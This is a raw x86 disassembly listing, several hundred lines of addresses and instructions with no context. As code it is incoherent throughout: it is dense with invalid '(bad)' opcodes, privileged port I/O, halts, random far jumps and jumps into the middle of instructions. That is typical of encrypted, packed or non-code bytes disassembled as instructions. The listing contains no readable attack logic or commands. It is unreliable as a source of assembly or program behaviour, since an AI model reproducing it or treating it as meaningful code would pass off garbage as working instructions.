  421d50:	mov    WORD PTR [ebp-0x63320ae9],?
  421d56:	cmp    esp,DWORD PTR [edx+esi*4-0x62]
  421d5a:	fisubr DWORD PTR ds:0xb85ddb06
  421d60:	mov    al,BYTE PTR ds:0xa5256fbb
  421d66:	inc    ebx
  421d67:	cmc    
  421d68:	(bad)  
  421d6a:	pop    esi
  421d6b:	shl    BYTE PTR [esi],0xb
  421d6e:	adc    ah,BYTE PTR [ecx]
  421d70:	sub    edi,edx
  421d72:	sub    eax,0x910927f
  421d77:	adc    eax,eax
  421d79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d7a:	dec    esp
  421d7b:	out    dx,eax
  421d7c:	das    
  421d7d:	mov    al,0xd5
  421d7f:	mov    eax,0xa405aadd
  421d84:	test   eax,0x40c01043
  421d89:	cld    
  421d8a:	xchg   esi,eax
  421d8b:	and    bl,BYTE PTR [esi+ebp*8]
  421d8e:	retf   
  421d8f:	push   0x44
  421d91:	push   cs
  421d92:	xchg   ebp,eax
  421d93:	cmp    edi,DWORD PTR [edi]
  421d95:	pushf  
  421d96:	and    al,0xc4
  421d98:	dec    ebx
  421d99:	dec    esp
  421d9a:	push   es
  421d9b:	add    ah,BYTE PTR [ecx+0x5a]
  421d9e:	imul   edx,DWORD PTR [eax+edi*8+0x1da39230],0xffffffd7
  421da6:	movq   QWORD PTR [ebx+edx*4-0x35],mm6
  421dab:	inc    ecx
  421dac:	xchg   ebx,eax
  421dad:	es out 0xd,eax
  421db0:	jle    0x421d55
  421db2:	fs out 0x59,eax
  421db5:	outs   dx,DWORD PTR ds:[esi]
  421db6:	jmp    0x96ab:0x408a9b9f
  421dbd:	xor    eax,0x639e3d70
  421dc2:	add    al,0x6f
  421dc4:	cmp    BYTE PTR [ebp+0x2b9d14ba],dh
  421dca:	jmp    0x2f6fc190
  421dcf:	inc    esp
  421dd0:	icebp  
  421dd1:	fsub   QWORD PTR [eax-0x76]
  421dd4:	push   ebp
  421dd5:	mov    al,ds:0xba00023f
  421dda:	or     DWORD PTR [eax-0x4b],ebp
  421ddd:	mov    al,ds:0xfb9cac63
  421de2:	jns    0x421dbb
  421de4:	lds    ecx,FWORD PTR [ebx-0x48]
  421de7:	test   ebp,esi
  421de9:	std    
  421dea:	je     0x421df6
  421dec:	jnp    0x421dbc
  421dee:	cli    
  421def:	or     ebp,edi
  421df1:	mov    cl,0x19
  421df3:	clc    
  421df4:	cmc    
  421df5:	(bad)  
  421df6:	xor    edx,DWORD PTR [esi+0x60]
  421df9:	jno    0x421dc1
  421dfb:	sub    BYTE PTR [esi-0x759b59d3],dl
  421e01:	mov    al,ds:0xb1a156b2
  421e06:	mov    BYTE PTR [ecx+0x19],al
  421e09:	jnp    0x421e44
  421e0b:	cdq    
  421e0c:	ret    0xa7e3
  421e0f:	dec    esp
  421e10:	jle    0x421e69
  421e12:	mov    dh,0x2
  421e14:	stos   BYTE PTR es:[edi],al
  421e15:	and    al,BYTE PTR [ebx+0x60939293]
  421e1b:	xor    BYTE PTR [ecx+0x74e53a3d],ch
  421e21:	cli    
  421e22:	out    0xf0,al
  421e24:	cli    
  421e25:	dec    esi
  421e26:	jmp    0x2607:0x58fea507
  421e2d:	xchg   ebx,eax
  421e2e:	xor    al,0xe4
  421e30:	xor    DWORD PTR [ecx],eax
  421e32:	sbb    esi,0x72876181
  421e38:	js     0x421dde
  421e3a:	in     eax,0x76
  421e3c:	test   esp,edx
  421e3e:	xchg   ecx,eax
  421e3f:	push   ebx
  421e40:	mov    al,ds:0x693a9d2e
  421e45:	or     BYTE PTR [ebp+0x2],cl
  421e48:	or     eax,0x91c0a3d8
  421e4d:	stos   BYTE PTR es:[edi],al
  421e4e:	mov    esi,0xdf089b55
  421e53:	xchg   ecx,eax
  421e54:	loopne 0x421e19
  421e56:	js     0x421e19
  421e58:	add    eax,0xf2867a75
  421e5d:	add    bl,BYTE PTR ds:0xa94c0b19
  421e63:	push   ss
  421e64:	adc    al,0x21
  421e66:	jge    0x421edf
  421e68:	fdivr  QWORD PTR [ebx-0xb]
  421e6b:	in     eax,dx
  421e6c:	jg     0x421ed5
  421e6e:	push   esi
  421e6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e70:	jecxz  0x421ea9
  421e72:	data16 ja 0x421e2d
  421e75:	xor    al,0xa4
  421e77:	loope  0x421e39
  421e79:	fidivr WORD PTR [esi-0x5f]
  421e7c:	popa   
  421e7d:	stos   BYTE PTR es:[edi],al
  421e7e:	hlt    
  421e7f:	inc    edx
  421e80:	add    DWORD PTR [ebp+ecx*8+0x44],ebx
  421e84:	inc    ebp
  421e85:	test   eax,0x149de637
  421e8a:	adc    al,0xc9
  421e8c:	popa   
  421e8d:	mov    al,ds:0x601f7333
  421e92:	inc    esp
  421e93:	call   0x7b04:0xa1c540d0
  421e9a:	sub    DWORD PTR [ecx],ebx
  421e9c:	stc    
  421e9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e9e:	scas   eax,DWORD PTR es:[edi]
  421e9f:	inc    ebx
  421ea0:	mov    fs,ebp
  421ea2:	mov    al,0xc8
  421ea4:	cld    
  421ea5:	pop    ds
  421ea6:	add    BYTE PTR [ebx+0x3e],cl
  421ea9:	repnz cld 
  421eab:	xchg   ebx,eax
  421eac:	or     esp,DWORD PTR [esi-0x72f6c57f]
  421eb2:	and    BYTE PTR [ebx+0x6eda24d7],dh
  421eb8:	and    DWORD PTR [ecx+0x3f83639f],eax
  421ebe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ebf:	sub    BYTE PTR [ebx],al
  421ec1:	mov    edi,0xf727b5e8
  421ec6:	xchg   edi,eax
  421ec7:	add    dh,bl
  421ec9:	dec    esp
  421eca:	(bad)  
  421ecb:	int    0x1b
  421ecd:	(bad)  
  421ece:	sub    eax,0x1dccc811
  421ed3:	nop
  421ed4:	add    dh,BYTE PTR [edi-0x49]
  421ed7:	scas   eax,DWORD PTR es:[edi]
  421ed8:	push   0x64
  421eda:	mov    ch,0xbd
  421edc:	jb     0x421ea4
  421ede:	push   es
  421edf:	out    dx,al
  421ee0:	outs   dx,DWORD PTR ds:[esi]
  421ee1:	adc    BYTE PTR [eax-0x6f],cl
  421ee4:	add    edi,DWORD PTR [edx+0x19]
  421ee7:	imul   edi,DWORD PTR [ebx-0x748000cf],0xffffffbb
  421eee:	cli    
  421eef:	cli    
  421ef0:	and    DWORD PTR [edi-0x7c],esi
  421ef3:	push   ds
  421ef4:	jge    0x421e85
  421ef6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ef7:	retf   0xa89a
  421efa:	sbb    eax,0x6ecfe92c
  421eff:	add    al,0x3c
  421f01:	lea    ebx,[esi]
  421f03:	cli    
  421f04:	cmp    ebp,DWORD PTR ss:[ebx-0x1bccfb65]
  421f0b:	and    dl,0x6c
  421f0e:	mov    dl,0xd0
  421f10:	jg     0x421f06
  421f12:	clc    
  421f13:	ret    0x793b
  421f16:	pop    ds
  421f17:	xor    esi,ebx
  421f19:	dec    esp
  421f1a:	adc    DWORD PTR [esp+ebx*2],0xffffffc5
  421f1e:	in     eax,dx
  421f1f:	aad    0x33
  421f21:	push   ebx
  421f22:	lea    ebp,[edi+0x19]
  421f25:	pop    esp
  421f26:	and    BYTE PTR [bp+di+0x64e5],bh
  421f2b:	mov    edi,ebx
  421f2d:	cmc    
  421f2e:	inc    ecx
  421f2f:	leave  
  421f30:	in     al,0xef
  421f32:	and    bh,BYTE PTR [esi+0x7219608a]
  421f38:	pop    ebp
  421f39:	jne    0x421f33
  421f3b:	repz jp 0x421f03
  421f3e:	in     al,0x94
  421f40:	(bad)  
  421f41:	mov    ebp,0x627a1b7
  421f46:	add    DWORD PTR [ecx],0xa9dc5cd7
  421f4c:	rcr    BYTE PTR [esi+edx*8+0x2d],cl
  421f50:	inc    esp
  421f51:	mov    al,ds:0x49685ccb
  421f56:	hlt    
  421f57:	cwde   
  421f58:	push   edi
  421f59:	mov    dh,0xe7
  421f5b:	nop
  421f5c:	mov    esp,0x75ca2bb1
  421f61:	loop   0x421f9a
  421f63:	ror    eax,cl
  421f65:	sbb    eax,0xff55e821
  421f6a:	adc    al,0x5f
  421f6c:	adc    BYTE PTR [edi+0x9],bl
  421f6f:	icebp  
  421f70:	hlt    
  421f71:	nop
  421f72:	ins    DWORD PTR es:[edi],dx
  421f73:	push   esi
  421f74:	out    0x51,eax
  421f76:	sti    
  421f77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f78:	ja     0x421f84
  421f7a:	dec    eax
  421f7b:	mov    edx,0x6ed964fd
  421f80:	sbb    eax,0x389229ed
  421f85:	jl     0x421f3f
  421f87:	push   es
  421f88:	cmp    bh,cl
  421f8a:	stc    
  421f8b:	sbb    eax,0x5ce6a198
  421f90:	mov    ch,0x0
  421f92:	pop    ss
  421f93:	aad    0x93
  421f95:	mov    ebx,0xb09e16db
  421f9a:	jne    0x421fc1
  421f9c:	in     eax,dx
  421f9d:	ficomp DWORD PTR [ebx+0x4551622e]
  421fa3:	sahf   
  421fa4:	in     al,0x89
  421fa6:	call   0xc938:0xc4f544e4
  421fad:	pop    ebx
  421fae:	mov    bh,0x5d
  421fb0:	enter  0xcfa6,0xaf
  421fb4:	stc    
  421fb5:	push   es
  421fb6:	cmp    ah,BYTE PTR [ebx-0x3663c6e]
  421fbc:	mov    bl,0x84
  421fbe:	mov    bh,0x99
  421fc0:	inc    esi
  421fc1:	push   cs
  421fc2:	jno    0x42201f
  421fc4:	xor    DWORD PTR cs:[esi+0x7a],ecx
  421fc8:	out    dx,al
  421fc9:	jmp    0xeb14:0xa760c14a
  421fd0:	add    DWORD PTR [edi-0x1ea05268],ebp
  421fd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fd7:	rol    DWORD PTR [edx+0x2741446d],0x73
  421fde:	add    cl,BYTE PTR [esi]
  421fe0:	and    DWORD PTR ds:0x122b2d34,ebx
  421fe6:	out    0xf4,eax
  421fe8:	jae    0x421fd5
  421fea:	in     al,0x55
  421fec:	mov    DWORD PTR [edi],edx
  421fee:	sub    DWORD PTR [esp+eax*8-0x337b36c4],ebx
  421ff5:	or     cl,bh
  421ff7:	jl     0x421f8d
  421ff9:	pop    eax
  421ffa:	sbb    eax,0x70d5fb2e
  421fff:	popa   
  422000:	loope  0x422062
  422002:	add    BYTE PTR [ebx+0x71],dl
  422005:	das    
  422006:	stc    
  422007:	cdq    
  422008:	sbb    ebx,DWORD PTR [edi-0x5972838a]
  42200e:	adc    BYTE PTR [ecx-0x6a7d5d83],dh
  422014:	fcmovb st,st(1)
  422016:	nop
  422017:	xor    al,0x9b
  422019:	jbe    0x421fba
  42201b:	or     DWORD PTR ds:0xefb42fdd,ecx
  422021:	cmp    al,0xfc
  422023:	pop    esi
  422024:	or     al,0x6c
  422026:	idiv   cl
  422028:	lods   al,BYTE PTR ds:[esi]
  422029:	mov    eax,0xa659130d
  42202e:	jl     0x421fe0
  422030:	je     0x42206e
  422032:	mov    ch,BYTE PTR [esi+0x3e24f61f]
  422038:	hlt    
  422039:	pop    ss
  42203a:	dec    edx
  42203b:	add    edi,DWORD PTR [edx+0x4626ff91]
  422041:	mov    bh,0xfa
  422043:	shr    DWORD PTR [esi+0x23],0x96
  422047:	add    edi,esp
  422049:	imul   ebp,DWORD PTR ds:0x7eef6c52,0xffffffc8
  422050:	mov    edi,0x9713f31c
  422055:	push   ss
  422056:	mov    ds:0x29609c4d,eax
  42205b:	xlat   BYTE PTR ds:[ebx]
  42205c:	pop    ss
  42205d:	and    ah,cl
  42205f:	or     eax,0x3106bcb5
  422064:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422065:	jmp    0xc49ff966
  42206a:	jns    0x42202f
  42206c:	mov    ebp,0x4c47fae6
  422071:	(bad)  
  422072:	xor    eax,DWORD PTR [esp+ecx*8]
  422075:	jne    0x422094
  422077:	and    eax,0x82581f60
  42207c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42207d:	call   0xa5de4d7f
  422082:	or     ecx,DWORD PTR [ebp-0x3e434deb]
  422088:	xchg   ebx,eax
  422089:	into   
  42208a:	jmp    0x422073
  42208c:	inc    eax
  42208d:	sbb    ebp,DWORD PTR [ebx]
  42208f:	out    dx,eax
  422090:	sar    BYTE PTR [esp+ebp*8],0x26
  422094:	lahf   
  422095:	jmp    0x517:0x8c7fe537
  42209c:	enter  0x7973,0x3c
  4220a0:	lea    ecx,[ecx+0x1614f278]
  4220a6:	aad    0x6e
  4220a8:	push   edx
  4220a9:	mov    edx,0x9e5c5353
  4220ae:	lea    edx,[edx+0x17d97b6c]
  4220b4:	cmp    al,0xf8
  4220b6:	les    ebx,FWORD PTR [esi-0x1e63e78]
  4220bc:	sub    eax,0x33c68dc3
  4220c1:	sub    BYTE PTR [edi-0x6e],dl
  4220c4:	imul   edx,esi,0xffffffe6
  4220c7:	js     0x422089
  4220c9:	sti    
  4220ca:	xlat   BYTE PTR ds:[ebx]
  4220cb:	cli    
  4220cc:	xchg   BYTE PTR [edi+0x4e],al
  4220cf:	xor    eax,0x3081d742
  4220d4:	(bad)  
  4220d5:	mov    dl,0x3e
  4220d7:	sbb    ecx,DWORD PTR [bp+si-0x45]
  4220db:	jge    0x42207e
  4220dd:	das    
  4220de:	push   ebx
  4220df:	inc    esi
  4220e0:	bswap  eax
  4220e2:	cmp    DWORD PTR [eax-0x13],ebp
  4220e5:	dec    ebp
  4220e6:	iret   
  4220e7:	push   eax
  4220e8:	daa    
  4220e9:	add    DWORD PTR [eax],0xcb40b5a3
  4220ef:	dec    ebp
  4220f0:	test   al,0xb1
  4220f2:	or     eax,0x6c538c34
  4220f7:	cld    
  4220f8:	clc    
  4220f9:	jns    0x4220ce
  4220fb:	push   edx
  4220fc:	mov    cl,0xd3
  4220fe:	jecxz  0x422109
  422100:	adc    al,0xd4
  422102:	pop    es
  422103:	and    ebp,esi
  422105:	xchg   esi,eax
  422106:	xchg   esp,eax
  422107:	test   BYTE PTR [edi+0xcf7d934],0xca
  42210e:	and    DWORD PTR [ecx+esi*4-0x222a3f1e],esi
  422115:	mov    edx,DWORD PTR [ebx+0x44]
  422118:	mov    cl,0xf8
  42211a:	or     esi,esp
  42211c:	xchg   DWORD PTR [ebx+0x46e00b7],ebp
  422122:	adc    eax,0x9171a362
  422127:	jae    0x42217a
  422129:	add    eax,0x349ed446
  42212e:	mov    eax,ds:0x9281dabb
  422133:	jge    0x422194
  422135:	sbb    ch,0xbf
  422138:	mov    eax,ds:0x95574f22
  42213d:	mov    ecx,0x86910425
  422142:	pop    edi
  422143:	std    
  422144:	jne    0x4220f9
  422146:	inc    eax
  422147:	scas   al,BYTE PTR es:[edi]
  422148:	jno    0x422175
  42214a:	xlat   BYTE PTR ds:[ebx]
  42214b:	int    0x13
  42214d:	icebp  
  42214e:	cmp    eax,DWORD PTR [ecx+ecx*1+0x174429]
  422155:	fcmovne st,st(3)
  422157:	xor    bl,BYTE PTR [ecx+edi*8]
  42215a:	xchg   edi,eax
  42215b:	aaa    
  42215c:	jbe    0x422165
  42215e:	xchg   ebx,eax
  42215f:	retf   
  422160:	out    dx,eax
  422161:	test   BYTE PTR [esi+0x2d856232],ch
  422167:	sti    
  422168:	push   0xc
  42216a:	and    eax,0x4562076d
  42216f:	in     eax,dx
  422170:	adc    esp,esi
  422172:	adc    DWORD PTR [eax+edx*8+0x4a4584ac],ebp
  422179:	or     DWORD PTR [esi],0xffffff9b
  42217c:	jns    0x422168
  42217e:	outs   dx,DWORD PTR ds:[esi]
  42217f:	lea    ebp,[esi+0x52]
  422182:	add    cl,dh
  422184:	je     0x422139
  422186:	inc    BYTE PTR [ebx]
  422188:	(bad)  [ecx+0x1d29669e]
  42218e:	faddp  st(5),st
  422190:	ss inc ebp
  422192:	jne    0x4221ef
  422194:	out    dx,eax
  422195:	xor    eax,0xa428088
  42219a:	pop    es
  42219b:	sti    
  42219c:	fs xor al,0xe
  42219f:	imul   ebx,DWORD PTR [ebx],0x75297fad
  4221a5:	pushf  
  4221a6:	mov    eax,0x735b9189
  4221ab:	test   BYTE PTR [ebp+0x6f26bdf9],bh
  4221b1:	es cdq 
  4221b3:	inc    edx
  4221b4:	in     eax,0xf4
  4221b6:	or     eax,DWORD PTR [ebx+0x5ae528cf]
  4221bc:	and    BYTE PTR [ebx-0x26],0xd4
  4221c0:	mov    ebp,0x4ae061ed
  4221c5:	and    eax,0x8fac0a8f
  4221ca:	push   edx
  4221cb:	jbe    0x4221ee
  4221cd:	out    dx,al
  4221ce:	push   0xffffffe7
  4221d0:	jmp    0x9afd:0x92be0997
  4221d7:	dec    eax
  4221d8:	add    ebp,esi
  4221da:	ret    0xb4a0
  4221dd:	ds mov dl,0xbe
  4221e0:	add    edx,DWORD PTR [eax-0x4ebe9a10]
  4221e6:	push   ebx
  4221e7:	sub    dh,BYTE PTR ss:[eax+0x1f]
  4221eb:	and    ebp,DWORD PTR [ebp-0x45368cc]
  4221f1:	xchg   edi,eax
  4221f2:	adc    eax,0x98ddd68f
  4221f7:	mov    eax,gs
  4221f9:	dec    ecx
  4221fa:	xor    bh,BYTE PTR [ebp-0x5]
  4221fd:	push   ecx
  4221fe:	adc    bh,dl
  422200:	in     al,dx
  422201:	dec    edi
  422202:	loop   0x422247
  422204:	pop    ebx
  422205:	inc    edi
  422206:	outs   dx,DWORD PTR ds:[esi]
  422207:	ficom  WORD PTR [ebp-0x13254a43]
  42220d:	sbb    BYTE PTR [ebp+eax*4+0x79b193a0],0x82
  422215:	sar    esp,1
  422217:	xchg   esp,eax
  422218:	cdq    
  422219:	popf   
  42221a:	add    ch,BYTE PTR [ecx-0xc664512]
  422220:	jp     0x4221fe
  422222:	test   eax,0xc5926335
  422227:	pop    es
  422228:	mov    cs,edi
  42222a:	sbb    ax,0x5e5a
  42222e:	inc    ebx
  422230:	cmp    ch,ah
  422232:	inc    edx
  422233:	scas   al,BYTE PTR es:[edi]
  422234:	out    dx,eax
  422235:	fistp  QWORD PTR [ebp-0x4c]
  422238:	lods   eax,DWORD PTR ds:[esi]
  422239:	jmp    0x42224b
  42223b:	cdq    
  42223c:	push   0xe943586c
  422241:	test   al,0x74
  422243:	sbb    eax,0x79bfda62
  422248:	push   DWORD PTR [ecx-0x58]
  42224b:	out    0xf7,al
  42224d:	inc    edi
  42224e:	cmc    
  42224f:	call   0xe8c3a370
  422254:	(bad)
  422259:	mov    ds:0x47469add,eax
  42225e:	jmp    0x4c95:0x78518ed2
  422265:	inc    eax
  422266:	clc    
  422267:	and    eax,0x4cdc8e32
  42226c:	mov    DWORD PTR [edx],ecx
  42226e:	stos   BYTE PTR es:[edi],al
  42226f:	jnp    0x422208
  422271:	clc    
  422272:	or     DWORD PTR [eax],ecx
  422274:	pop    edx
  422275:	inc    esi
  422276:	setns  ah
  422279:	xchg   esp,eax
  42227a:	push   ss
  42227b:	fs mov eax,0x3023fedf
  422281:	imul   BYTE PTR [esi]
  422283:	nop
  422284:	popa   
  422285:	and    eax,0xdc472206
  42228a:	cwde   
  42228b:	sub    eax,0x799fdbe5
  422290:	sub    ebx,edx
  422292:	pop    ebp
  422293:	sar    DWORD PTR [edx+0x58d2365d],0xdf
  42229a:	pushf  
  42229b:	jbe    0x42229b
  42229d:	sbb    al,0xff
  42229f:	and    BYTE PTR [esi+0x0],bl
	...
  4222aa:	inc    edx
  4222ab:	inc    esp
  4222ac:	inc    ebx
  4222ad:	push   edi
  4222ae:	inc    edi
  4222af:	push   edi
  4222b0:	push   esi
  4222b1:	push   ebp
  4222b2:	outs   dx,DWORD PTR ds:[esi]
  4222b3:	pop    ebp
  4222b4:	mov    ds:0xb0fffdc,eax
  4222b9:	add    ecx,DWORD PTR [eax-0x4f]
  4222bc:	add    DWORD PTR [eax],eax
  4222be:	jg     0x4222c6
  4222c0:	add    BYTE PTR [eax],al
  4222c2:	jmp    0x680234b0
  4222c7:	sbb    eax,0x8727690c
  4222cc:	jmp    0xbda8:0xbadbc4c
  4222d3:	shl    bl,cl
  4222d5:	sub    eax,0x1e8c3733
  4222da:	and    BYTE PTR [edi],cl
  4222dc:	push   edx
  4222dd:	mov    DWORD PTR ds:0x75f370e6,edi
  4222e3:	xchg   BYTE PTR [ebx],dl
  4222e5:	mov    bl,0xc6
  4222e7:	sub    ch,BYTE PTR [eax+0x57]
  4222ea:	jecxz  0x422341
  4222ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222ed:	jns    0x4222ac
  4222ef:	sbb    DWORD PTR [eax+0x4e],0x88bf117e
  4222f6:	pushf  
  4222f7:	jecxz  0x4222c1
  4222f9:	mov    WORD PTR [edx-0x7c372001],?
  4222ff:	pusha  
  422300:	ja     0x42229f
  422302:	in     al,0x66
  422304:	int    0x9f
  422306:	out    dx,al
  422307:	mov    bl,0x59
  422309:	ret    0x6356
  42230c:	les    edi,FWORD PTR [edx-0x21b478d1]
  422312:	push   cs
  422313:	loope  0x4222c7
  422315:	jecxz  0x4222ab
  422317:	lahf   
  422318:	mov    al,ds:0x4b45356
  42231d:	std    
  42231e:	jg     0x422391
  422320:	pusha  
  422321:	mov    bh,0x37
  422323:	adc    BYTE PTR [ecx-0x4f],ah
  422326:	jmp    0x422345
  422328:	mov    esi,0xfc4d8ee9
  42232d:	rcr    DWORD PTR [eax+0xa58d5ff],1
  422333:	jnp    0x42230f
  422335:	xor    DWORD PTR [esi-0x56ce5ca3],edx
  42233b:	add    eax,0x50ab122a
  422340:	mov    eax,ds:0xe66dc1f9
  422345:	call   0x9957aada
  42234a:	aad    0x5b
  42234c:	sbb    bh,cl
  42234e:	xor    DWORD PTR [edx+0x24250aea],edi
  422354:	jmp    0x5b71f84d
  422359:	mov    ds:0x314f826c,al
  42235e:	adc    ecx,ecx
  422360:	inc    DWORD PTR [edi]
  422362:	jp     0x4222fc
  422364:	mov    esi,0xe0571bba
  422369:	cmp    al,0x64
  42236b:	or     BYTE PTR [esi],cl
  42236d:	fistp  DWORD PTR [ebx+ebx*2-0x4770e685]
  422374:	mov    cl,0xe2
  422376:	dec    edi
  422377:	mov    ecx,0x4911f431
  42237c:	push   ecx
  42237d:	fsubr  st,st(2)
  42237f:	jge    0x422301
  422381:	jmp    0x7f92:0xb60fd767
  422388:	cmp    ebx,DWORD PTR [ebx-0x42]
  42238b:	jg     0x42233d
  42238d:	bound  ebp,QWORD PTR [ebx+0x79b22a0]
  422393:	or     al,0xa5
  422395:	daa    
  422396:	in     eax,0xde
  422398:	aam    0xa5
  42239a:	mov    esi,0x64743a51
  42239f:	iret   
  4223a0:	add    DWORD PTR [ebx-0x650eda68],edx
  4223a6:	adc    al,0x3
  4223a8:	mov    al,ds:0xc73d7a54
  4223ad:	pop    eax
  4223ae:	push   ebp
  4223af:	repz sub ebx,ebx
  4223b2:	mov    ebp,ds
  4223b4:	mov    cs,WORD PTR [ecx+esi*4-0x382caf17]
  4223bb:	fcmovb st,st(7)
  4223bd:	leave  
  4223be:	out    dx,al
  4223bf:	pop    ebx
  4223c0:	mov    cl,dl
  4223c2:	nop
  4223c3:	retf   0x3c37
  4223c6:	xchg   ebp,eax
  4223c7:	jb     0x422371
  4223c9:	scas   al,BYTE PTR es:[edi]
  4223ca:	in     eax,dx
  4223cb:	inc    eax
  4223cc:	fidiv  DWORD PTR [edx-0x819a2cc]
  4223d2:	push   0x6229e9a
  4223d7:	popa   
  4223d8:	out    dx,al
  4223d9:	add    ch,BYTE PTR ds:0xc048951
  4223df:	xchg   ebx,eax
  4223e0:	mov    ah,0x7c
  4223e2:	sbb    BYTE PTR [edx],dh
  4223e4:	mov    ah,0xc8
  4223e6:	add    eax,0x26ca387b
  4223eb:	ds push esp
  4223ed:	cli    
  4223ee:	xor    eax,0x9174c96f
  4223f3:	loopne 0x4223ba
  4223f5:	push   ds
  4223f6:	iret   
  4223f7:	and    BYTE PTR [edi-0x8],ch
  4223fa:	jnp    0x422472
  4223fc:	jecxz  0x4223e4
  4223fe:	jbe    0x422440
  422400:	xor    dh,BYTE PTR [eax]
  422402:	cmp    edx,edx
  422404:	mov    edi,0xeb679462
  422409:	inc    eax
  42240a:	add    DWORD PTR [edi+eax*8+0xced29ce],0xffffffda
  422412:	leave  
  422413:	dec    ebx
  422414:	test   BYTE PTR ds:0xdaf852c,bh
  42241a:	fimul  DWORD PTR [ecx+edi*1+0x69a75f3e]
  422421:	xchg   ebp,eax
  422422:	hlt    
  422423:	sub    ebx,DWORD PTR [edx+0x15]
  422426:	push   0x8c2a8e19
  42242b:	ror    BYTE PTR [esp+edi*2-0x151c7c7a],1
  422432:	fs int 0xbe
  422435:	in     al,0x3d
  422437:	xchg   edi,eax
  422438:	ds clc 
  42243a:	jle    0x422454
  42243c:	or     dl,BYTE PTR [edx]
  42243e:	popa   
  42243f:	shl    dh,0xf1
  422442:	loop   0x4223e4
  422444:	out    dx,al
  422445:	pop    ecx
  422446:	jmp    0xb4a86903
  42244b:	mov    bh,0x3c
  42244d:	jmp    0xfc58:0x80d65d66
  422454:	mov    BYTE PTR [ebx],0x5e
  422457:	cmc    
  422458:	div    DWORD PTR [edi]
  42245a:	dec    eax
  42245b:	push   0xffffffbb
  42245d:	add    DWORD PTR [ecx],edi
  42245f:	jle    0x4224e0
  422461:	test   BYTE PTR [ecx+0x4a],dh
  422464:	mov    dh,0x76
  422466:	nop
  422467:	clc    
  422468:	int    0x11
  42246a:	pop    esi
  42246b:	sub    ebx,DWORD PTR ss:[eax]
  42246e:	cli    
  42246f:	(bad)  
  422470:	mov    ch,0x9e
  422472:	daa    
  422473:	icebp  
  422474:	sbb    al,cl
  422476:	push   eax
  422477:	cmp    cl,bh
  422479:	xchg   esp,eax
  42247a:	ja     0x422476
  42247c:	lods   eax,DWORD PTR ds:[esi]
  42247d:	jbe    0x422499
  42247f:	test   eax,0xbf2073f9
  422484:	test   DWORD PTR [ecx+0x3f6870a],0x1b3462be
  42248e:	jo     0x422453
  422490:	repnz int3 
  422492:	mov    ebp,0xc64a94f7
  422497:	icebp  
  422498:	inc    ebx
  422499:	(bad)  
  42249b:	mov    bh,0x64
  42249d:	outs   dx,DWORD PTR ds:[esi]
  42249e:	pop    esp
  42249f:	loopne 0x4224d0
  4224a1:	repnz (bad) 
  4224a4:	psrlw  mm7,QWORD PTR [ecx+0x3c0fa60]
  4224ab:	popa   
  4224ac:	call   0x2d78:0xbfd707d1
  4224b3:	daa    
  4224b4:	pop    ebx
  4224b5:	sub    al,0x18
  4224b7:	mov    ecx,0xc72a32bb
  4224bc:	arpl   WORD PTR [ebp-0x1d],sp
  4224bf:	adc    edx,DWORD PTR [esi-0x72]
  4224c2:	xchg   esi,eax
  4224c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224c4:	retf   
  4224c5:	in     al,dx
  4224c6:	mov    dh,0x12
  4224c8:	adc    edi,DWORD PTR [si-0x3290]
  4224cd:	or     DWORD PTR [ecx+ebp*1-0x73],ecx
  4224d1:	push   ebx
  4224d2:	fst    DWORD PTR [edi-0x40]
  4224d5:	fld    TBYTE PTR [eax-0x38]
  4224d8:	(bad)  
  4224d9:	aam    0x27
  4224db:	and    al,0xc0
  4224dd:	ret    
  4224de:	loop   0x4224d1
  4224e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224e1:	out    0x6d,al
  4224e3:	pop    ss
  4224e4:	out    dx,al
  4224e5:	addr16 das 
  4224e7:	mov    bl,dl
  4224e9:	jmp    0x422539
  4224eb:	push   edx
  4224ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224ed:	loope  0x4224ff
  4224ef:	or     BYTE PTR [ecx-0x4238b747],al
  4224f5:	xor    al,0x4f
  4224f7:	cmc    
  4224f8:	ret    
  4224f9:	sbb    ebx,edx
  4224fb:	in     eax,dx
  4224fc:	xor    ecx,0x49f6fde6
  422502:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422503:	addr16 pop edx
  422505:	popa   
  422506:	mov    dl,0xa7
  422508:	sbb    eax,0xdda24c9b
  42250d:	and    DWORD PTR [ebp-0x4efc2f21],ebx
  422513:	ds and eax,0x785deca6
  422519:	test   DWORD PTR ds:0x8defec2e,esp
  42251f:	adc    BYTE PTR [ebx],bl
  422521:	clc    
  422522:	mov    esp,0xd1451f54
  422527:	sbb    eax,ebx
  422529:	mov    ecx,0x922a5688
  42252e:	fwait
  42252f:	sbb    ecx,esi
  422531:	inc    ebp
  422532:	push   ebp
  422533:	repnz mov dl,0xb3
  422536:	sti    
  422537:	in     eax,dx
  422538:	push   cs
  422539:	cmp    BYTE PTR [edx+0x16b1d4ed],bl
  42253f:	dec    edx
  422540:	mov    esp,DWORD PTR [edx]
  422542:	push   ss
  422543:	js     0x42254f
  422545:	aam    0x45
  422547:	out    0xec,eax
  422549:	jb     0x4224d3
  42254b:	adc    dh,BYTE PTR [edi+ebp*2-0x5]
  42254f:	scas   eax,DWORD PTR es:[edi]
  422550:	xchg   esp,eax
  422551:	in     al,dx
  422552:	das    
  422553:	jbe    0x422526
  422555:	repz sub edx,DWORD PTR [edi]
  422558:	daa    
  422559:	dec    esp
  42255a:	sub    al,0x33
  42255c:	fild   WORD PTR [edi+edx*8]
  42255f:	pop    edx
  422560:	scas   eax,DWORD PTR es:[edi]
  422561:	mov    edi,0x54054e4d
  422566:	into   
  422567:	cwde   
  422568:	push   ds
  422569:	out    dx,al
  42256a:	xor    edx,esp
  42256c:	adc    al,0x28
  42256e:	outs   dx,BYTE PTR ds:[esi]
  42256f:	sbb    ebx,ebp
  422571:	cli    
  422572:	addr16 jae 0x42254f
  422575:	inc    edi
  422576:	clc    
